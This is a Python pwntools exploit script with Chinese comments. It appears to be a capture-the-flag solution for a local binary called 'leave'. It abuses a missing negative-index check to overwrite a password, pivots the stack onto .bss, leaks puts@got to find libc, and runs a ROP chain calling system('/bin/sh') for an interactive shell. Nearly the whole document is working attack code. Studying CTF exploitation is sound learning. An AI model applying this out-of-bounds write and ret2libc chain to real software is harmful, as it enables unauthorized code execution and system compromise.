from pwn import *

r = process(r'./leave')
elf = ELF(r'./leave')
libc = ELF(r'./libc.so.6')
context.log_level = 'debug'

# add()函数读取一个 4 字节的索引buf，仅检查buf > 9的情况，但未检查buf < 0的情况。那么可以输入负数索引，从而访问数组array之外的内存地址
# array数组的地址为：0x4040A0，password的地址为：0x404048，两者相差-0x58, 即88/4=22
# 即通过array[-22]就能越界访问password的地址
# -22的补码为：0xffffffea, 小端序下为：\xea\xff\xff\xff
r.sendafter(b'index(0-9): ', b'\xea\xff\xff\xff')
# password == 1131796, 1131796的十六进制为：0x114514, 小端序下为：\x14\x45\x11\x00
r.sendafter(b']: ', b'\x14\x45\x11\x00')
r.recvline()

# 进入check函数的溢出点，这里buf大小0x30，read的字节为0x40，明显不够。
# 需要进行栈迁移
leave_ret = 0x40122c
ret_addr = 0x40101a
pop_rdi = 0x40122e
pop_rbp = 0x40117d
bss_addr = 0x404200
read_addr = 0x401255
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
print(f"puts@plt: {hex(puts_plt)}\nputs@got: {hex(puts_got)}")
# gdb.attach(r)
# ►         0x404000           0x405000 rw-p
# 迁移到 0x404000~0x405000 之间，rwp即rwx, 这里选择迁移到 0x404200，+0x30是因为在跳转到read函数后，rsi的值是rbp+buf(-0x30)
# check函数中自带了leave_ret指令，这里就不需要再leave了，ret跳转到read函数 (此时rbp到达bss+0X30,rsp还在read函数上)
leave_payload = b'A' * 0x30 + p64(bss_addr + 0x30) + p64(read_addr)
# 泄露puts@got地址，伪造下一次栈迁移的地址为：0x404200 + 0x200 + 0x30
puts_payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rbp) + p64(bss_addr + 0x200 + 0x30) + p64(read_addr)
puts_payload = puts_payload.ljust(0x30, b'A')  # 填充至溢出点
puts_payload += p64(bss_addr - 8) + p64(leave_ret)  # leave跳转执行流到bss_addr上，mov rsp,rbp;pop rdp时rsp会自动+8

# gdb.attach(r)
r.send(leave_payload)
r.send(puts_payload)

puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_addr: {hex(puts_addr)}")

# 计算基地址
base_addr = puts_addr - libc.sym['puts']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()

system_payload = b'B' * 8 + p64(ret_addr) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr) + p64(0)
system_payload = system_payload.ljust(0x30, b'B')
system_payload += p64(bss_addr + 0x200) + p64(leave_ret)

r.send(system_payload)
r.interactive()
